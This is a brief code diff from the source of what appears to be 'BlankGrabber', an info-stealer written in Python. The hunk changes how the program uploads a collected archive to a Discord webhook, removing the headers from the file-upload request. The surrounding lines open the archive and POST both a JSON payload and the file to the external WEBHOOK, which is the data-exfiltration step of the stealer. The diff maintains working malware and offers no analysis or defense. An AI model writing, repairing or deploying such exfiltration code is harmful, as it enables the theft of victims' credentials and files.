@@ -1154,7 +1154,7 @@ class BlankGrabber:
 }       
         with open(self.archive, 'rb') as file:
             self.http.request("POST", WEBHOOK, body= json.dumps(payload).encode(), headers= Discord.getHeaders())
-            self.http.request('POST', WEBHOOK, fields= {'file' : (self.archive, file.read())}, headers= Discord.getHeaders())
+            self.http.request('POST', WEBHOOK, fields= {'file' : (self.archive, file.read())})
 
 if __name__ == '__main__':
     if FROZEN := hasattr(sys, 'frozen'):
